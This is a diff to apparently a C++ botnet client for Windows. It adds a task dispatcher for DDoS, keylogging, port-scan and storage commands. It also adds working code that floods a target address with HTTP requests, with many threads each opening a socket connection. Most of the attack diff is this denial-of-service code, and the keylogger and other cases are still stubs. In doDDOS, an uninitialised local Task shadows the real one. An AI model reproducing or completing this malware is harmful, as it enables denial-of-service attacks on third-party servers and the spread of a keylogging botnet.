@@ -7,6 +7,7 @@
 #include "nlohmann/json.hpp"
 #include "win_functions.h"
 #include "task.h"
+#include <thread>
 
 using json = nlohmann::json;
 
@@ -479,4 +480,154 @@ std::string getRAMInfo() {
     }
 
     return "";
+}
+
+bool doTask(const char* serverIP, int serverPort, Task task) {
+    TaskOptions tOption = getTaskOption(task.task);
+    bool finishedSuccessfully = false;
+    switch (tOption) {
+        case TaskOptions::DDOS:
+            std::cout << "Processing DDOS task..." << std::endl;
+            // Add DDOS task handling code here
+            finishedSuccessfully = doDDOS(task);;
+            break;
+        case TaskOptions::KEY_LOG:
+            std::cout << "Processing KEY_LOG task..." << std::endl;
+            // Add KEY_LOG task handling code here
+            finishedSuccessfully = true;
+            break;
+        case TaskOptions::PORT_SCAN:
+            std::cout << "Processing PORT_SCAN task..." << std::endl;
+            // Add PORT_SCAN task handling code here
+            finishedSuccessfully = true;
+            break;
+        case TaskOptions::QUACK:
+            std::cout << "Processing QUACK task..." << std::endl;
+            // Add QUACK task handling code here
+            finishedSuccessfully = true;
+            break;
+        case TaskOptions::STORAGE:
+            std::cout << "Processing STORAGE task..." << std::endl;
+            // Add STORAGE task handling code here
+            finishedSuccessfully = true;
+            break;
+        case TaskOptions::UNKNOWN:
+            std::cout << "Unknown task option." << std::endl;
+            // Add code for handling unknown task here
+            finishedSuccessfully = false;
+            break;
+    }
+    return finishedSuccessfully;
+}
+
+void makeHttpDDOSRequest(std::string address, bool log) {
+    WSADATA wsaData;
+    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
+        std::cerr << "Failed to initialize Winsock." << std::endl;
+        return;
+    }
+
+    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
+    if (sock == INVALID_SOCKET) {
+        std::cerr << "Failed to create socket." << std::endl;
+        WSACleanup();
+        return;
+    }
+
+    sockaddr_in serverAddress;
+    serverAddress.sin_family = AF_INET;
+    serverAddress.sin_addr.s_addr = inet_addr(address.c_str());
+    serverAddress.sin_port = htons(8080);
+
+    // Create an event object
+    HANDLE event = WSACreateEvent();
+    if (event == WSA_INVALID_EVENT) {
+        std::cerr << "Failed to create event object." << std::endl;
+        closesocket(sock);
+        WSACleanup();
+        return;
+    }
+
+    // Associate the event object with the socket
+    if (WSAEventSelect(sock, event, FD_CONNECT) == SOCKET_ERROR) {
+        std::cerr << "Failed to associate event with socket." << std::endl;
+        WSACloseEvent(event);
+        closesocket(sock);
+        WSACleanup();
+        return;
+    }
+
+    // Connect to the server asynchronously
+    if (connect(sock, reinterpret_cast<sockaddr*>(&serverAddress), sizeof(serverAddress)) == SOCKET_ERROR) {
+        if (WSAGetLastError() != WSAEWOULDBLOCK) {
+            std::cerr << "Failed to connect to the server." << std::endl;
+            WSACloseEvent(event);
+            closesocket(sock);
+            WSACleanup();
+            return;
+        }
+    }
+
+    std::string httpRequest = "GET / HTTP/1.1\r\n"
+        "Host: " + address + "\r\n"
+        "Connection: close\r\n"
+        "Content-Type: application/json\r\n"
+        "\r\n";
+
+    // Wait for the connection to complete or timeout
+    DWORD result = WSAWaitForMultipleEvents(1, &event, FALSE, 5000, FALSE);
+    if (result == WSA_WAIT_FAILED) {
+        std::cerr << "Failed to wait for events." << std::endl;
+    }
+    else if (result == WSA_WAIT_TIMEOUT) {
+        std::cerr << "Timed out while waiting for connection." << std::endl;
+    }
+    else {
+        // Connection successful, send the HTTP request
+        if (send(sock, httpRequest.c_str(), httpRequest.length(), 0) == SOCKET_ERROR) {
+            std::cerr << "Failed to send HTTP request." << std::endl;
+        }
+        else {
+            if (log) {
+                // Receive and print the response
+                char buffer[1024];
+                int bytesRead = recv(sock, buffer, sizeof(buffer), 0);
+                if (bytesRead == SOCKET_ERROR) {
+                    std::cerr << "Failed to receive response." << std::endl;
+                }
+                else if (bytesRead > 0) {
+                    // Assuming the response is in ASCII format
+                    std::string response(buffer, bytesRead);
+                    std::cout << "Received response: " << response << std::endl;
+                }
+                else {
+                    std::cerr << "No response received." << std::endl;
+                }
+            }
+        }
+    }
+    // Clean up
+    WSACloseEvent(event);
+    closesocket(sock);
+    WSACleanup();
+    return;
+}
+
+bool doDDOS(Task task) {
+    std::string address = task.taskParams.address;
+    int interval = task.taskParams.interval;
+
+    std::vector<std::thread> threads;
+
+    for (int i = 0; i < interval; ++i) {
+        Task task; // Initialize task as needed
+        threads.emplace_back(makeHttpDDOSRequest, address.c_str(), task.taskParams.log);
+    }
+
+    for (std::thread& thread : threads) {
+        thread.join();
+    }
+    std::cout << "all done" << std::endl;
+
+    return true;
 }
